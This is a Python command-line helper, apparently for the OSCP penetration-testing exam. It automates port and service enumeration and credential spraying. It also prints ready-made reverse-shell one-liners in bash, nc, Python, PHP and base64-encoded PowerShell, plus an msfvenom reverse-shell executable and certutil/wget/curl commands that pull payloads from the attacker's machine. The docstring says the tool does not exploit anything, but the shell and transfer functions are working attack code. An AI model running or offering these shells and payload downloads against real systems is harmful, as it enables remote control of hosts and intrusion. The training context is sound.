#!/usr/bin/env python3
"""
oscp.py — OSCP exam helper (ENUMERATION / SETUP / WORKFLOW only; exam-compliant).

  Automates enumeration & busy-work — NOT exploitation. Understand every command.
  Run enum in the background while you manually probe 80/443/445.

Usage:
  ./oscp.py enum <ip>                       # full TCP scan -> service scan -> web/smb fan-out
  ./oscp.py spray <user> <pass> <ip|file>   # validate one credential across services
  ./oscp.py shell <type> [port]             # print a reverse shell with your IP filled in
                                            #   types: bash sh nc python php ps msf-exe
  ./oscp.py transfer <file>                 # print how a target pulls <file> from your Kali
  ./oscp.py hosts <cidr>                    # alive hosts on a subnet (post-pivot)
  ./oscp.py ws <name> <ip>                  # make ~/oscp/<name> workspace
  ./oscp.py ip                              # show your tun0 (LHOST)

Your IP is auto-detected from tun0 (override with:  IP=10.10.14.x ./oscp.py ...).
"""
import argparse, subprocess, os, sys, re, base64, pathlib


def my_ip():
    if os.environ.get("IP"):
        return os.environ["IP"]
    try:
        out = subprocess.check_output("ip -o -4 addr show tun0", shell=True, text=True, stderr=subprocess.DEVNULL)
        return out.split()[3].split("/")[0]
    except Exception:
        return "<LHOST>"


IP = my_ip()


def run(cmd, background=False):
    print(f"[>] {cmd}")
    if background:
        subprocess.Popen(cmd, shell=True)
    else:
        subprocess.run(cmd, shell=True)


def cmd_enum(a):
    ip = a.ip
    os.makedirs("scans", exist_ok=True)
    print(f"[*] full TCP scan {ip} ...")
    run(f"nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt {ip}")
    try:
        ports = ",".join(re.findall(r"^(\d+)/tcp\s+open", open("scans/all-tcp.txt").read(), re.M))
    except FileNotFoundError:
        ports = ""
    print(f"[+] open ports: {ports or '(none)'}")
    if not ports:
        return
    run(f"nmap -p{ports} -sCV -Pn -oN scans/scv.txt {ip}")
    run(f"nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt {ip}", background=True)
    pl = ports.split(",")
    if any(p in pl for p in ("80", "443", "8080", "8000")):
        print("[*] web -> whatweb + feroxbuster (background)")
        run(f"whatweb http://{ip}")
        run(f"feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt "
            f"-x php,txt,html -o scans/ferox.txt", background=True)
    if "445" in pl:
        print("[*] smb -> nxc + enum4linux-ng")
        run(f"nxc smb {ip} -u '' -p '' --shares")
        run(f"enum4linux-ng -A {ip} > scans/enum4.txt", background=True)
    if "88" in pl:
        print("[!] port 88 open -> this is a DC / AD -> see [AD-QUICK]")
    print("[+] done. read scans/scv.txt and route each port via [ENUM-DECISION].")


def cmd_spray(a):
    for s in ("smb", "winrm", "ldap", "mssql", "rdp", "ssh"):
        print(f"=== {s} ===")
        subprocess.run(f"nxc {s} {a.host} -u '{a.user}' -p '{a.password}' --continue-on-success",
                       shell=True)


def _ps_b64(L, port):
    ps = (f"$client=New-Object System.Net.Sockets.TCPClient('{L}',{port});$stream=$client.GetStream();"
          "[byte[]]$bytes=0..65535|%{0};"
          "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){"
          "$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);"
          "$sb=(iex $data 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
          "$sbt=([Text.Encoding]::ASCII).GetBytes($sb2);"
          "$stream.Write($sbt,0,$sbt.Length);$stream.Flush()}")
    return "powershell -e " + base64.b64encode(ps.encode("utf-16-le")).decode()


def cmd_shell(a):
    L, p = IP, a.port
    shells = {
        "bash":   f"bash -c 'bash -i >& /dev/tcp/{L}/{p} 0>&1'",
        "sh":     f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {L} {p} >/tmp/f",
        "nc":     f"nc {L} {p} -e /bin/bash        # win: nc.exe {L} {p} -e cmd.exe",
        "python": f"""python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{L}",{p}));"""
                  f"""[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'""",
        "php":    f"""php -r '$s=fsockopen("{L}",{p});exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "ps":     _ps_b64(L, p),
        "msf-exe": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={L} LPORT={p} -f exe -o rev.exe",
    }
    print(shells.get(a.type, "types: " + ", ".join(shells) + "   (URL-encode for web params!)"))


def cmd_transfer(a):
    f = a.file
    print(f"# Linux:   wget http://{IP}/{f} -O /tmp/{f}   ||   curl http://{IP}/{f} -o /tmp/{f}")
    print(f"# Windows: certutil -urlcache -split -f http://{IP}/{f} {f}   ||   "
          f"powershell iwr http://{IP}/{f} -OutFile {f}")
    print(f"# (serve the folder holding {f} first:  python3 -m http.server 80)")


def cmd_hosts(a):
    subprocess.run(f"nxc smb {a.cidr}", shell=True)


def cmd_ws(a):
    base = pathlib.Path.home() / "oscp" / a.name
    for d in ("scans", "loot", "exploits", "www"):
        (base / d).mkdir(parents=True, exist_ok=True)
    print(f"[+] workspace {base} ready.  cd {base} ; export T={a.ip}  (IP={IP})")


def cmd_ip(a):
    print(IP)


def main():
    p = argparse.ArgumentParser(description="OSCP exam helper (enumeration/setup/workflow only)")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("enum"); s.add_argument("ip"); s.set_defaults(fn=cmd_enum)
    s = sub.add_parser("spray"); s.add_argument("user"); s.add_argument("password"); s.add_argument("host"); s.set_defaults(fn=cmd_spray)
    s = sub.add_parser("shell"); s.add_argument("type"); s.add_argument("port", nargs="?", default="443"); s.set_defaults(fn=cmd_shell)
    s = sub.add_parser("transfer"); s.add_argument("file"); s.set_defaults(fn=cmd_transfer)
    s = sub.add_parser("hosts"); s.add_argument("cidr"); s.set_defaults(fn=cmd_hosts)
    s = sub.add_parser("ws"); s.add_argument("name"); s.add_argument("ip"); s.set_defaults(fn=cmd_ws)
    s = sub.add_parser("ip"); s.set_defaults(fn=cmd_ip)

    args = p.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
